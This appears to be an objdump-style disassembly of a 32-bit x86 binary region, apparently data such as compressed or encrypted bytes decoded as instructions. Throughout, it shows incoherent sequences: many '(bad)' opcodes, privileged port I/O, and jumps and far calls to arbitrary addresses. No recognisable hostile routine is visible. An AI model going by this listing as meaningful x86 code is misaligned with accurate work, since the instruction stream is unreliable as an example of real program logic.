  419cbf:	mov    bh,0x36
  419cc1:	cmp    eax,0xc7e7ba03
  419cc6:	fisub  WORD PTR [eax-0x1961a260]
  419ccc:	scas   al,BYTE PTR es:[edi]
  419ccd:	es aam 0xe9
  419cd0:	fwait
  419cd1:	in     eax,0x2f
  419cd3:	(bad)  
  419cd4:	jg     0x419cc3
  419cd6:	pop    ecx
  419cd7:	inc    eax
  419cd9:	pop    es
  419cda:	shl    ch,cl
  419cdc:	sub    cl,0xb3
  419cdf:	jno    0x419d0d
  419ce1:	xchg   edx,eax
  419ce2:	sahf   
  419ce3:	mov    bl,0x6d
  419ce5:	push   cs
  419ce6:	fdiv   DWORD PTR [edi]
  419ce8:	or     BYTE PTR [eax-0x72c84cb8],al
  419cee:	mov    ebp,0xfb5be728
  419cf3:	popa   
  419cf4:	sbb    bh,BYTE PTR [eax-0x46]
  419cf7:	fptan  
  419cf9:	mov    eax,0x2ae45887
  419cfe:	hlt    
  419cff:	test   al,0x51
  419d01:	es inc esi
  419d03:	ss out 0x23,eax
  419d06:	(bad)  
  419d08:	adc    al,0x78
  419d0a:	out    0x72,al
  419d0c:	stos   DWORD PTR es:[edi],eax
  419d0d:	popa   
  419d0e:	push   esi
  419d0f:	jle    0x419cb3
  419d11:	add    edi,ebx
  419d13:	dec    ecx
  419d14:	mov    edx,0x5917dc7d
  419d19:	xchg   ecx,eax
  419d1a:	sti    
  419d1b:	dec    eax
  419d1c:	shl    DWORD PTR [edx],0xed
  419d1f:	cmp    dl,bh
  419d21:	cmp    eax,0xe0bc71cf
  419d26:	iret   
  419d27:	jecxz  0x419d9f
  419d29:	arpl   WORD PTR [edi+eiz*2+0x1b],di
  419d2d:	dec    ebx
  419d2e:	pop    ebp
  419d2f:	addr16 fcomip st,st(5)
  419d32:	push   esp
  419d33:	js     0x419cee
  419d35:	jo     0x419ce3
  419d37:	mov    edx,0x1a91b81d
  419d3c:	pop    ecx
  419d3d:	shl    BYTE PTR [edi-0x29],cl
  419d40:	pop    edi
  419d41:	or     ebp,DWORD PTR [ebx+0x62819ca1]
  419d47:	aam    0xb1
  419d49:	ror    esp,cl
  419d4b:	mov    ?,WORD PTR [edx]
  419d4d:	adc    bl,BYTE PTR [edi]
  419d4f:	xor    eax,0xc227c8b8
  419d54:	pushf  
  419d55:	pop    ebp
  419d56:	int3   
  419d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d58:	fisubr WORD PTR [ecx-0x5a07440a]
  419d5e:	adc    BYTE PTR ds:0x69081dc2,dl
  419d64:	xchg   DWORD PTR [esi+0xf],esi
  419d67:	aam    0x8
  419d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d6a:	loop   0x419cf9
  419d6c:	sub    eax,0xe1ce25bf
  419d71:	mov    bl,0x71
  419d73:	inc    edx
  419d74:	jg     0x419d34
  419d76:	xor    eax,0x16045d54
  419d7b:	jl     0x419d73
  419d7d:	mov    al,0xe
  419d7f:	ins    BYTE PTR es:[edi],dx
  419d80:	popf   
  419d81:	dec    edx
  419d82:	dec    eax
  419d83:	cli    
  419d84:	inc    esi
  419d85:	pushw  ds
  419d87:	cmp    eax,0x225d5484
  419d8d:	lds    ecx,FWORD PTR [eax]
  419d8f:	xchg   esp,eax
  419d90:	and    esp,esi
  419d92:	dec    ebp
  419d93:	fucomi st,st(6)
  419d95:	adc    BYTE PTR [edx-0x2e],0x7d
  419d99:	les    ecx,FWORD PTR [eax-0x1d]
  419d9c:	xchg   esi,eax
  419d9d:	shl    BYTE PTR [ebx-0x4c],cl
  419da0:	push   ecx
  419da1:	shl    dl,1
  419da3:	ret    
  419da4:	(bad)  
  419da5:	sti    
  419da6:	ins    DWORD PTR es:[edi],dx
  419da7:	jmp    0xdce8b570
  419dac:	in     al,0x90
  419dae:	adc    dh,cl
  419db0:	(bad)  
  419db1:	pop    ebx
  419db2:	mov    ch,0xf2
  419db4:	mov    dl,0x47
  419db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419db7:	and    dl,BYTE PTR [esi]
  419db9:	rcr    BYTE PTR [edi-0xe07fd82],1
  419dbf:	scas   eax,DWORD PTR es:[edi]
  419dc0:	repz fcomp DWORD PTR [eax]
  419dc3:	ret    
  419dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dc5:	mov    ch,0x0
  419dc7:	out    0xd9,eax
  419dc9:	inc    ebp
  419dca:	pop    es
  419dcb:	scas   al,BYTE PTR es:[edi]
  419dcc:	push   ebp
  419dcd:	gs retf 
  419dcf:	sub    BYTE PTR [ecx+0xf],ah
  419dd2:	mov    bh,0xb7
  419dd4:	fcomp  QWORD PTR [eax-0x80]
  419dd7:	or     bh,BYTE PTR [eax-0x3493025e]
  419ddd:	cmp    ah,BYTE PTR [ebx]
  419ddf:	js     0x419dc3
  419de1:	inc    edi
  419de2:	xor    DWORD PTR [eax],0x9
  419de5:	xor    dl,dl
  419de7:	add    eax,0xed8a87a9
  419dec:	xchg   ebp,eax
  419ded:	loopne 0x419e61
  419def:	jle    0x419e10
  419df1:	jo     0x419dd8
  419df3:	aas    
  419df4:	das    
  419df5:	and    edi,DWORD PTR [edx*4+0x5e7426b3]
  419dfc:	sbb    edx,DWORD PTR [ebx-0x431d579]
  419e02:	dec    esi
  419e03:	fcmovu st,st(7)
  419e05:	inc    edx
  419e06:	sbb    eax,0xd34c2abf
  419e0b:	in     eax,0x5
  419e0d:	outs   dx,DWORD PTR ds:[esi]
  419e0e:	clc    
  419e0f:	xchg   ecx,eax
  419e10:	out    0xd0,al
  419e12:	sbb    cl,ah
  419e14:	mov    ebx,0x3d7d18cb
  419e19:	into   
  419e1a:	in     eax,0xad
  419e1c:	inc    ebp
  419e1d:	adc    eax,0x9a0214bb
  419e22:	pop    edx
  419e23:	retf   
  419e24:	ficom  DWORD PTR ds:0x96ee5ec2
  419e2a:	(bad)  
  419e2b:	lahf   
  419e2c:	mov    WORD PTR [ebp+0x59],ds
  419e2f:	jns    0x419e14
  419e31:	xor    al,0xa2
  419e33:	test   al,0xb4
  419e35:	add    esi,DWORD PTR [ecx+0x75]
  419e38:	int    0xb5
  419e3a:	xor    esp,edx
  419e3c:	inc    ecx
  419e3d:	push   es
  419e3e:	lods   eax,DWORD PTR ds:[esi]
  419e3f:	mov    dl,0x5
  419e41:	int3   
  419e42:	iret   
  419e43:	adc    eax,0xded2b044
  419e48:	in     al,0xbe
  419e4a:	ins    DWORD PTR es:[edi],dx
  419e4b:	cwde   
  419e4c:	stos   DWORD PTR es:[edi],eax
  419e4d:	pop    ss
  419e4e:	fwait
  419e4f:	pusha  
  419e50:	jne    0x419e46
  419e52:	stos   BYTE PTR es:[edi],al
  419e53:	sbb    esi,esp
  419e55:	pop    esi
  419e56:	add    DWORD PTR [edx+0x32],eax
  419e59:	lods   al,BYTE PTR ds:[esi]
  419e5a:	ror    eax,cl
  419e5c:	addr16 xchg edx,eax
  419e5e:	sbb    eax,0xb10adb82
  419e63:	sub    al,0x9f
  419e65:	cld    
  419e66:	mov    WORD PTR ds:0xd8283823,?
  419e6c:	retf   
  419e6d:	xchg   ebx,eax
  419e6e:	shl    esp,0xc7
  419e71:	adc    al,0xd9
  419e73:	imul   ecx,DWORD PTR [edi+0x13],0xa33b8719
  419e7a:	sbb    ah,BYTE PTR [ecx-0x76cec0ec]
  419e80:	mov    esi,0x6ae70b99
  419e85:	mov    BYTE PTR [esp+ebp*4+0x53],ah
  419e89:	ret    
  419e8a:	imul   BYTE PTR [eax-0x7312322f]
  419e90:	push   0x9d37dc85
  419e95:	out    0xf5,al
  419e97:	xor    bh,ch
  419e99:	mov    ah,0xd8
  419e9b:	mov    WORD PTR [esi-0x3b],?
  419e9e:	cdq    
  419e9f:	pop    ss
  419ea0:	repnz dec eax
  419ea2:	sbb    DWORD PTR [ebx+0x32de6643],0x4327f79d
  419eac:	jle    0x419f03
  419eae:	cs inc edi
  419eb0:	nop
  419eb1:	rcr    DWORD PTR [eax+0x47],0x29
  419eb5:	sub    edi,DWORD PTR [ebx+0x6602cc98]
  419ebb:	push   esp
  419ebc:	loop   0x419e4d
  419ebe:	shr    esp,0xbd
  419ec1:	jno    0x419e9e
  419ec3:	or     al,0xb0
  419ec5:	aam    0x9a
  419ec7:	inc    ebp
  419ec8:	pop    ebp
  419ec9:	int    0x2c
  419ecb:	push   edi
  419ecc:	fcom   DWORD PTR ds:0x293e3b80
  419ed2:	loope  0x419ee6
  419ed4:	aad    0xf6
  419ed6:	mul    BYTE PTR [eax-0x6b]
  419ed9:	popa   
  419eda:	jecxz  0x419e84
  419edc:	hlt    
  419edd:	mov    bh,0x86
  419edf:	sar    DWORD PTR [ebp+0x3b265c7d],cl
  419ee5:	pop    eax
  419ee6:	call   0x678f2444
  419eeb:	ins    DWORD PTR es:[edi],dx
  419eec:	data16 jbe 0x419e96
  419eef:	mov    es,WORD PTR [esi-0x73abed8e]
  419ef5:	mov    ebp,0x23aec547
  419efa:	out    dx,eax
  419efb:	ja     0x419f43
  419efd:	popa   
  419efe:	in     eax,dx
  419eff:	ret    0xf7b5
  419f02:	sbb    DWORD PTR [edx-0xf],ecx
  419f05:	shr    DWORD PTR [ebx-0x5c],cl
  419f08:	std    
  419f09:	cdq    
  419f0a:	cmp    BYTE PTR [edx+edi*4+0x58],cl
  419f0e:	cwde   
  419f0f:	mov    bl,0xa3
  419f11:	jae    0x419ed1
  419f13:	jns    0x419f8f
  419f15:	jle    0x419f34
  419f17:	xchg   ebx,eax
  419f18:	cmc    
  419f19:	or     al,0x28
  419f1b:	xor    DWORD PTR [ecx+edi*2+0x3bb9046f],ebp
  419f22:	cld    
  419f23:	in     eax,dx
  419f24:	aas    
  419f25:	dec    edi
  419f26:	dec    ecx
  419f27:	fisttp DWORD PTR [edx+ecx*4+0x2920232d]
  419f2e:	ja     0x419fac
  419f30:	(bad)  
  419f31:	popa   
  419f32:	cli    
  419f33:	or     edx,DWORD PTR [ebx+eax*2-0x51f24328]
  419f3a:	and    DWORD PTR [ebp-0x50],ebp
  419f3d:	sub    dh,BYTE PTR [esi+0x9]
  419f40:	or     edi,DWORD PTR [esi+ebx*4+0x41]
  419f44:	lods   eax,DWORD PTR ds:[esi]
  419f45:	cmp    bl,BYTE PTR [edi+ebp*4]
  419f48:	mov    esi,DWORD PTR [ebx+ebx*8+0x3f]
  419f4c:	mov    al,0x6
  419f4e:	mov    ch,0x9c
  419f50:	rol    DWORD PTR [edx-0x13e27d33],1
  419f56:	xchg   edx,eax
  419f57:	sbb    ebx,esp
  419f59:	xor    al,0x6e
  419f5b:	mov    ebx,0x5fcc74da
  419f60:	and    esp,DWORD PTR [ecx+ebp*4+0x51]
  419f64:	xor    edi,ecx
  419f66:	or     ebp,edx
  419f68:	sahf   
  419f69:	bound  edi,QWORD PTR [esi]
  419f6b:	sub    dh,BYTE PTR cs:[esi]
  419f6e:	lea    edx,[eax]
  419f70:	fdivr  DWORD PTR [edi-0x7e]
  419f73:	dec    edx
  419f74:	pushf  
  419f75:	(bad)  
  419f76:	xchg   ebp,eax
  419f77:	imul   edx,DWORD PTR [ecx-0x32b418be],0x62b8a37b
  419f81:	in     al,0xbb
  419f83:	fnstsw WORD PTR [esi-0x167cfced]
  419f89:	xor    al,0x21
  419f8b:	xchg   ebp,eax
  419f8c:	pushf  
  419f8d:	cmp    BYTE PTR [edx+esi*1-0x14ad328a],cl
  419f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f95:	mov    ecx,0xa10f185a
  419f9a:	jbe    0x41a002
  419f9c:	sbb    BYTE PTR [ecx],dl
  419f9e:	push   cs
  419f9f:	dec    ecx
  419fa0:	aam    0xcc
  419fa2:	fld    DWORD PTR [ebx-0x5b719b6c]
  419fa8:	jns    0x419f46
  419faa:	pop    ds
  419fab:	mov    esp,0x7aef61c1
  419fb0:	test   dl,dl
  419fb2:	or     eax,0x5dd80dd3
  419fb7:	mov    dh,0x35
  419fb9:	ret    
  419fba:	sub    eax,0x64456b0a
  419fbf:	or     edi,ebp
  419fc1:	pop    es
  419fc2:	in     al,0xe4
  419fc4:	lahf   
  419fc5:	and    dl,BYTE PTR [edi+0x2e]
  419fc8:	(bad)  
  419fc9:	ror    BYTE PTR [eax+edx*8-0x8],cl
  419fcd:	(bad)  
  419fce:	push   0xb7645180
  419fd3:	adc    dl,BYTE PTR [ebx+esi*1+0x78ffc1d5]
  419fda:	loopne 0x419ffd
  419fdc:	sub    eax,0x75234c15
  419fe1:	jno    0x419fca
  419fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fe4:	inc    edi
  419fe5:	fcmovbe st,st(5)
  419fe7:	imul   edx,DWORD PTR [ebx+0x10],0xfffffff1
  419feb:	mov    ds:0x9e2bdbc4,eax
  419ff0:	out    dx,eax
  419ff1:	push   ebp
  419ff2:	xchg   ecx,eax
  419ff3:	aam    0x9c
  419ff5:	ret    
  419ff6:	bound  ebp,QWORD PTR [edx]
  419ff8:	mov    ebp,0x8b815a44
  419ffd:	fcomp  DWORD PTR [edx]
  419fff:	mov    BYTE PTR [esi-0x25822f13],bh
  41a005:	dec    eax
  41a006:	jne    0x419fbf
  41a008:	rcl    DWORD PTR [eax+0x3781a6ec],cl
  41a00e:	gs pop edx
  41a010:	bound  ebp,QWORD PTR ds:0x90701546
  41a016:	(bad)  
  41a017:	lods   al,BYTE PTR ds:[esi]
  41a018:	leave  
  41a019:	xor    edi,DWORD PTR [edi]
  41a01b:	cli    
  41a01c:	pop    ebp
  41a01d:	es xchg edi,eax
  41a01f:	in     eax,0x72
  41a021:	jb     0x41a05f
  41a023:	xchg   DWORD PTR [ecx+eax*8+0x4a],esi
  41a027:	mov    eax,0x4252b3ba
  41a02c:	or     DWORD PTR [edx-0x70],ecx
  41a02f:	pop    ebx
  41a030:	mov    eax,0x35331c2f
  41a035:	lea    esp,cs:[esi+edi*1]
  41a039:	mov    edx,DWORD PTR [ecx]
  41a03b:	call   0xa05c:0x8a834e6f
  41a042:	sbb    BYTE PTR [eax+0x5e],ah
  41a045:	xacquire xchg DWORD PTR [edx],edx
  41a048:	mov    bh,0xe9
  41a04a:	fadd   DWORD PTR [ecx+0x77c509fa]
  41a050:	and    al,0x5b
  41a052:	fnstcw WORD PTR [edx-0x71162618]
  41a058:	in     al,0x7b
  41a05a:	in     al,dx
  41a05b:	sahf   
  41a05c:	adc    DWORD PTR [edi-0x4c],edx
  41a05f:	push   ebp
  41a060:	mov    bh,0xf7
  41a062:	mov    ecx,0x2d3919ec
  41a067:	rol    DWORD PTR [edx],0xb5
  41a06a:	xchg   edi,eax
  41a06b:	(bad)  [edi]
  41a06d:	adc    DWORD PTR [ecx],edx
  41a06f:	test   BYTE PTR [edx],0x95
  41a072:	add    ebp,DWORD PTR [eax+0x23342a30]
  41a078:	xchg   esp,eax
  41a079:	aaa    
  41a07a:	push   esi
  41a07b:	mov    al,BYTE PTR [eax-0x53]
  41a07e:	lock mov es,WORD PTR [edi+0x460589d6]
  41a085:	add    DWORD PTR [edi+0x75f03a60],eax
  41a08b:	and    eax,0x774d03fb
  41a090:	cmp    BYTE PTR [eax-0x2a1abf77],bh
  41a096:	repnz inc edx
  41a098:	cli    
  41a099:	loopne 0x41a039
  41a09b:	or     bl,BYTE PTR ds:0x4131c2ca
  41a0a1:	jmp    0x603807b3
  41a0a6:	push   edx
  41a0a7:	mov    edi,0x79ff645d
  41a0ac:	cmp    esi,DWORD PTR [ebx*4+0x222c9112]
  41a0b3:	jmp    0x41a093
  41a0b5:	lds    esi,FWORD PTR [edx-0x280a3102]
  41a0bb:	loop   0x41a0f7
  41a0bd:	inc    eax
  41a0be:	push   eax
  41a0bf:	mov    DWORD PTR [esi],edx
  41a0c1:	push   esi
  41a0c2:	xor    eax,0xb5c82a97
  41a0c7:	cwde   
  41a0c8:	add    eax,0x6819c578
  41a0cd:	dec    eax
  41a0ce:	adc    BYTE PTR [eax+0x30c43155],ch
  41a0d4:	jg     0x41a151
  41a0d6:	xor    eax,0x5
  41a0d9:	icebp  
  41a0da:	call   0x4363:0xaaddc089
  41a0e1:	ja     0x41a0b5
  41a0e3:	sbb    edi,DWORD PTR [ebp-0x74]
  41a0e6:	jmp    0xf813:0x594ef76a
  41a0ed:	xchg   esi,eax
  41a0ee:	jb     0x41a07c
  41a0f0:	sbb    al,0x7f
  41a0f2:	(bad)  
  41a0f3:	das    
  41a0f4:	cmp    BYTE PTR [eax+0x4],ch
  41a0f7:	ss jp  0x41a0dd
  41a0fa:	lock fnstenv [ecx+0x4e]
  41a0fe:	loop   0x41a176
  41a100:	retf   
  41a101:	les    ebx,FWORD PTR [ebx]
  41a103:	dec    eax
  41a104:	mov    ecx,0x581cbfd7
  41a109:	es rol ecx,0x59
  41a10d:	lock push ecx
  41a10f:	sbb    bh,ah
  41a111:	mov    ds:0x344cf799,eax
  41a116:	outs   dx,BYTE PTR ds:[esi]
  41a117:	sub    esp,edx
  41a119:	add    edx,DWORD PTR [ebx]
  41a11b:	mov    ch,0xce
  41a11d:	inc    ebx
  41a11e:	stos   BYTE PTR es:[edi],al
  41a11f:	dec    eax
  41a120:	add    eax,0x4c215a1e
  41a125:	push   es
  41a126:	aam    0xc0
  41a128:	aad    0x55
  41a12a:	out    0x9d,eax
  41a12c:	gs jae 0x41a0e5
  41a12f:	or     bl,BYTE PTR [edi-0x1f]
  41a132:	mov    ebx,0xa603b95f
  41a137:	mov    cl,0x2a
  41a139:	mov    gs,WORD PTR [edx]
  41a13b:	(bad)  
  41a13c:	in     al,0x14
  41a13e:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41a140:	xlat   BYTE PTR ds:[ebx]
  41a141:	cmp    esp,esi
  41a143:	mov    ch,BYTE PTR [ebx+edi*4+0x33]
  41a147:	push   0x66
  41a149:	mov    ds:0xc7e753b,eax
  41a14e:	sub    al,cl
  41a150:	push   ds
  41a151:	(bad)  [edx-0x57f5a9f7]
  41a157:	pop    ebx
  41a158:	dec    al
  41a15a:	adc    BYTE PTR [eax+0x24],ah
  41a15d:	add    esp,ebp
  41a15f:	jmp    0x41a1da
  41a161:	jb     0x41a190
  41a163:	inc    ebp
  41a164:	adc    ah,dl
  41a166:	add    ebx,DWORD PTR [ebp+ecx*1+0x19]
  41a16a:	or     esi,DWORD PTR [esi+0x6e1600f7]
  41a170:	fcomp  QWORD PTR ds:0x16c85e16
  41a176:	test   DWORD PTR [eax],esi
  41a178:	mov    ebp,0x23d51ca5
  41a17d:	(bad)  
  41a17e:	jmp    0x41a197
  41a180:	add    dh,0x14
  41a183:	mov    dl,0xa8
  41a185:	jp     0x41a1ca
  41a187:	stos   DWORD PTR es:[edi],eax
  41a188:	xor    eax,0xc3f92bb9
  41a18d:	mov    edi,0xc4ffb0b0
  41a192:	dec    DWORD PTR [edi]
  41a194:	shl    BYTE PTR [ecx-0x20],cl
  41a197:	out    dx,eax
  41a198:	xchg   ah,bh
  41a19a:	push   esi
  41a19b:	(bad)  
  41a19c:	rol    BYTE PTR [esi],1
  41a19e:	imul   esi,eax,0x9ada43c2
  41a1a4:	fmul   st,st(1)
  41a1a6:	(bad)  
  41a1a7:	push   eax
  41a1a8:	or     DWORD PTR [edx],ebx
  41a1aa:	nop
  41a1ab:	cwde   
  41a1ac:	(bad)
  41a1af:	(bad)  
  41a1b0:	jmp    0xc059:0xaeda17be
  41a1b7:	mov    ds:0xbe3d1f25,eax
  41a1bc:	pushf  
  41a1bd:	cs pop eax
  41a1bf:	adc    eax,0x290f36ea
  41a1c4:	jl     0x41a176
  41a1c6:	addr16 sar ah,0xcf
  41a1ca:	fs sub eax,0x2ffd1293
  41a1d0:	pusha  
  41a1d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1d2:	sti    
  41a1d3:	and    bh,cl
  41a1d5:	pop    ecx
  41a1d6:	sub    eax,0x38d810e1
  41a1db:	aad    0x25
  41a1dd:	xchg   ecx,eax
  41a1de:	js     0x41a1e3
  41a1e0:	shr    BYTE PTR [ebx-0x54],0x43
  41a1e4:	leave  
  41a1e5:	pusha  
  41a1e6:	push   edi
  41a1e7:	dec    ecx
  41a1e8:	outs   dx,DWORD PTR ds:[esi]
  41a1e9:	pop    edx
  41a1ea:	rol    DWORD PTR [edx+eiz*1+0x6b],0xdc
  41a1ef:	xchg   DWORD PTR [ebx],esi
  41a1f1:	(bad)  
  41a1f2:	push   esp
  41a1f3:	push   ss
  41a1f4:	sahf   
  41a1f5:	jge    0x41a221
  41a1f7:	rcl    DWORD PTR [edx],0xc6
  41a1fa:	jne    0x41a1bc
  41a1fc:	lea    ebx,[edx+0x79ed55b1]
  41a202:	push   ebp
  41a203:	(bad)  
  41a204:	ss in  eax,0x1a
  41a207:	and    dl,BYTE PTR [ebx+0x39]
  41a20a:	pusha  
  41a20b:	or     BYTE PTR [esi-0x49ad155f],dl
  41a211:	cli    
  41a212:	and    eax,0x93497caa
  41a217:	pop    ss
  41a218:	add    DWORD PTR [ebx-0x37],esi
  41a21b:	int3   
  41a21c:	scas   eax,DWORD PTR es:[edi]
  41a21d:	loope  0x41a1cd
  41a21f:	dec    eax
  41a220:	sub    bl,BYTE PTR [esi+0x1ee24b40]
  41a226:	mov    dl,BYTE PTR [ebx+0x6f9a91fc]
  41a22c:	xor    BYTE PTR [esi],dh
  41a22e:	stc    
  41a22f:	dec    ebp
  41a230:	das    
  41a231:	(bad)  
  41a232:	or     esi,DWORD PTR [eax+edi*4-0x25c0b2da]
  41a239:	push   edx
  41a23a:	xlat   BYTE PTR ds:[ebx]
  41a23b:	arpl   WORD PTR [edi+0x70456721],cx
  41a241:	mov    bh,0x80
  41a243:	inc    cl
  41a245:	dec    esi
  41a246:	jecxz  0x41a26a
  41a248:	xchg   edx,eax
  41a249:	fsub   DWORD PTR [ecx+esi*1]
  41a24c:	and    eax,DWORD PTR [eax]
  41a24e:	pop    eax
  41a24f:	stos   BYTE PTR es:[edi],al
  41a250:	fild   DWORD PTR [esi]
  41a252:	ss sub al,0xc4
  41a255:	mov    ah,0x4c
  41a257:	fcom   st(7)
  41a259:	pop    esp
  41a25a:	and    ah,BYTE PTR [edi+0x7b46e0eb]
  41a260:	call   0xf96fb472
  41a265:	inc    esi
  41a266:	sub    edx,DWORD PTR [ecx-0x66]
  41a269:	(bad)  [ebx+0x69]
  41a26c:	add    bh,ch
  41a26e:	inc    esi
  41a26f:	clc    
  41a270:	inc    eax
  41a271:	sti    
  41a272:	dec    edi
  41a273:	add    ebp,edi
  41a275:	aas    
  41a276:	or     eax,0xbed0bd8a
  41a27b:	pop    esp
  41a27c:	pop    es
  41a27d:	xor    al,0xc
  41a27f:	inc    ebp
  41a280:	in     al,0x56
  41a282:	dec    edx
  41a283:	fnstsw WORD PTR [ebx-0x2d75e636]
  41a289:	out    0x8c,al
  41a28b:	mov    ecx,0x8a743a7d
  41a290:	fild   DWORD PTR [ecx+0x5cbb2af7]
  41a296:	sbb    DWORD PTR [edx+ebp*8],esp
  41a299:	inc    esi
  41a29a:	int    0x76
  41a29c:	xor    ebp,edx
  41a29e:	addr16 jns 0x41a2ef
  41a2a1:	mov    cl,0x6f
  41a2a3:	aam    0x50
  41a2a5:	mov    bh,0x37
  41a2a7:	in     al,0xf2
  41a2a9:	mov    ebp,0xd054ac0d
  41a2ae:	mov    cl,0xba
  41a2b0:	xor    eax,0xba3f38
  41a2b5:	(bad)  
  41a2b6:	sahf   
  41a2b7:	scas   al,BYTE PTR es:[edi]
  41a2b8:	push   edi
  41a2b9:	jnp    0x41a2e3
  41a2bb:	ins    DWORD PTR es:[edi],dx
  41a2bc:	jge    0x41a2dd
  41a2be:	rcr    BYTE PTR [eax],cl
  41a2c0:	jmp    0x7164:0xc9165110
  41a2c7:	xor    esi,ecx
  41a2c9:	mov    ds:0xbb6d4d55,eax
  41a2ce:	cmp    DWORD PTR [eax-0x7b],eax
  41a2d1:	xchg   ebp,eax
  41a2d2:	(bad)  
  41a2d4:	mov    cl,0x65
  41a2d6:	sub    eax,0x5cfefb86
  41a2db:	sub    ch,BYTE PTR [edx-0x62]
  41a2de:	es out 0xed,eax
  41a2e1:	cmp    edx,DWORD PTR [edx]
  41a2e3:	inc    esp
  41a2e4:	xor    eax,0x9ebbd955
  41a2e9:	aam    0xf2
  41a2eb:	call   0x759:0x9c04cb0d
  41a2f2:	sbb    ch,BYTE PTR [edx+eiz*4]
  41a2f5:	push   es
  41a2f6:	cli    
  41a2f7:	adc    dl,dh
  41a2f9:	rcr    BYTE PTR [esi+0x6b],cl
  41a2fc:	loopne 0x41a2fc
  41a2fe:	(bad)  
  41a2ff:	fld    st(4)
  41a301:	xor    edi,edx
  41a303:	leave  
  41a304:	inc    esi
  41a305:	dec    edx
  41a306:	outs   dx,DWORD PTR ds:[esi]
  41a307:	aas    
  41a308:	icebp  
  41a309:	mov    DWORD PTR [esi-0x727f39ea],ecx
  41a30f:	mov    esp,0xeedd4207
  41a314:	inc    ebp
  41a315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a316:	fnstcw WORD PTR [eax-0x64]
  41a319:	or     BYTE PTR [edi+ebx*2-0x5e],al
  41a31d:	lds    ebp,FWORD PTR [ebx+0x53d5bd3e]
  41a323:	inc    DWORD PTR [esi+0x5b1afdb2]
  41a329:	and    eax,0x56deccc4
  41a32e:	push   ebx
  41a32f:	xor    ecx,DWORD PTR [eax+0x4d82ba20]
  41a335:	pusha  
  41a336:	dec    edi
  41a337:	push   ss
  41a338:	pop    es
  41a339:	pop    ecx
  41a33a:	or     al,0xfe
  41a33c:	gs add al,0x48
  41a33f:	cwde   
  41a340:	in     al,dx
  41a341:	mov    al,ds:0xc7e5b360
  41a346:	rol    edi,1
  41a348:	xchg   edi,eax
  41a349:	xor    edx,ebx
  41a34b:	retf   
  41a34c:	addr16 push ecx
  41a34e:	xor    BYTE PTR [eax-0x5a1000d5],bh
  41a354:	xor    al,0xd4
  41a356:	inc    ebp
  41a357:	jp     0x41a30d
  41a359:	lock xchg edx,eax
  41a35b:	sahf   
  41a35c:	fiadd  WORD PTR [ecx+0x197f6987]
  41a362:	in     eax,dx
  41a363:	jmp    FWORD PTR [esi-0x7c]
  41a366:	scas   al,BYTE PTR es:[edi]
  41a367:	retf   0x9e02
  41a36a:	imul   esp,DWORD PTR [edi],0x51c2854c
  41a370:	dec    ebx
  41a371:	jb     0x41a34a
  41a373:	repnz lods eax,DWORD PTR ds:[esi]
  41a375:	ror    edx,cl
  41a377:	xchg   esi,eax
  41a378:	add    ebx,edx
  41a37a:	(bad)  
  41a37b:	bound  ebx,QWORD PTR ds:0x20052d30
  41a381:	mov    ch,0x84
  41a383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a384:	mov    dl,0xb9
  41a386:	clc    
  41a387:	mov    edi,0x4a39411e
  41a38c:	push   ss
  41a38d:	repnz cmp DWORD PTR [ecx],ecx
  41a390:	inc    edi
  41a391:	(bad)  
  41a392:	loope  0x41a361
  41a394:	and    edx,edx
  41a396:	inc    ebx
  41a397:	rcr    BYTE PTR [edi+ebx*8-0x24725815],cl
  41a39e:	out    0xb6,al
  41a3a0:	ror    ch,1
  41a3a2:	sar    DWORD PTR [eax-0x7],cl
  41a3a5:	cdq    
  41a3a6:	pop    ecx
  41a3a7:	add    al,dl
  41a3a9:	sbb    bh,BYTE PTR [ebx+0x49]
  41a3ac:	pop    ecx
  41a3ad:	mov    esp,0x524cb346
  41a3b2:	sub    BYTE PTR [ebp+0x2c],ch
  41a3b5:	dec    edx
  41a3b6:	xor    DWORD PTR [edi+0x78],ecx
  41a3b9:	inc    edi
  41a3ba:	scas   eax,DWORD PTR es:[edi]
  41a3bb:	in     al,dx
  41a3bc:	add    DWORD PTR [ebp+0x18],edi
  41a3bf:	push   edi
  41a3c0:	aas    
  41a3c1:	xchg   edx,eax
  41a3c2:	mov    ebp,0x58eea65f
  41a3c7:	or     eax,0xdf6a41cc
  41a3cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3cd:	test   al,0x91
  41a3cf:	leave  
  41a3d0:	or     BYTE PTR [eax+0x7c5b944],ch
  41a3d6:	push   0xffffffb7
  41a3d8:	sbb    al,0x6e
  41a3da:	rol    dh,0xdd
  41a3dd:	jge    0x41a446
  41a3df:	into   
  41a3e0:	addr16 jne 0x41a3d3
  41a3e3:	setns  BYTE PTR [esi]
  41a3e6:	mov    eax,0x5add50d7
  41a3eb:	call   FWORD PTR [edi-0x4460cfa1]
  41a3f1:	mov    ah,0x43
  41a3f3:	ret    
  41a3f4:	out    dx,al
  41a3f5:	jp     0x41a426
  41a3f7:	sbb    al,dl
  41a3f9:	out    dx,al
  41a3fa:	leave  
  41a3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3fc:	jl     0x41a3a0
  41a3fe:	mov    BYTE PTR [eax+0x35],cl
  41a401:	fdivrp st(4),st
  41a403:	dec    ecx
  41a404:	pop    edx
  41a405:	sbb    dh,dl
  41a407:	add    DWORD PTR [ebx-0x32b19d90],0xe4c72c38
  41a411:	mov    al,ds:0x98556557
  41a416:	daa    
  41a417:	mov    al,ds:0xe7b73e1b
  41a41c:	retf   0x65e4
  41a41f:	stc    
  41a420:	pop    es
  41a421:	and    al,ah
  41a423:	adc    DWORD PTR [ecx+0x47],ecx
  41a426:	mov    ecx,0x3c426912
  41a42b:	nop
  41a42c:	mov    dh,0x5e
  41a42e:	adc    al,0x60
  41a430:	sub    edi,DWORD PTR [esp+eiz*2+0xe29090b]
  41a437:	push   edx
  41a438:	fwait
  41a439:	test   eax,0xc84eb68f
  41a43e:	jo     0x41a45e
  41a440:	xor    eax,0x8644341e
